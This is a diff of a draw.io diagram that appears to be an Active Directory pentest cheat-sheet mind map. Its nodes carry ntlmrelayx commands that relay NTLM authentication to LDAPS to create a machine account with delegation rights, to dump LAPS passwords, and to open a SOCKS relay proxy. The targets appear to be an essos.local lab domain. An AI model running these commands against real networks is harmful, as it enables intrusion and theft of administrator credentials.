@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-07-11T09:13:01.956Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" etag="Uh3dyNROtNCsNbsDRNIj" version="24.6.4" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2024-07-11T09:13:44.508Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" etag="j7sYjakjo7SmMzIw24KA" version="24.6.4" type="github" pages="7">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel grid="1" page="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -402,7 +402,7 @@
           <mxGeometry x="1890" y="1025" width="350" height="60" as="geometry" />
         </mxCell>
         <object label="création d&#39;un compte machine (MAQ)" cmd="ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access" id="QkhrWf05NAjAX-w3R0dh-1">
-          <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
+          <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" parent="1" vertex="1">
             <mxGeometry x="1900" y="1100" width="260" height="90" as="geometry" />
           </mxCell>
         </object>
@@ -469,9 +469,11 @@
         <mxCell id="TZkWSDr6438spexavPfF-1" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=-0.003;entryY=0.62;entryDx=0;entryDy=0;entryPerimeter=0;" parent="1" source="X6wlxV_FrzrZ-9Moiesy-8" target="KTRm8kq6GDk7_ihK_bxa-8" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="gim2rbIdz-NWKrZqOkX9-2" value="DACL abuse" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" vertex="1" parent="1">
-          <mxGeometry x="1940" y="1216" width="150" height="50" as="geometry" />
-        </mxCell>
+        <object label="DACL abuse" cmd="ntlmrelayx -t ldaps://10.248.2.86 -smb2support --remove-mic --dump-laps" id="gim2rbIdz-NWKrZqOkX9-2">
+          <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1" parent="1">
+            <mxGeometry x="1940" y="1216" width="150" height="50" as="geometry" />
+          </mxCell>
+        </object>
         <object label="&lt;div&gt;Proxy socks&lt;/div&gt;" cmd="ntlmrelayx -tf  smb_targets.txt -smb2support -socks" id="gim2rbIdz-NWKrZqOkX9-6">
           <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1" parent="1">
             <mxGeometry x="1534" y="660" width="220" height="80" as="geometry" />
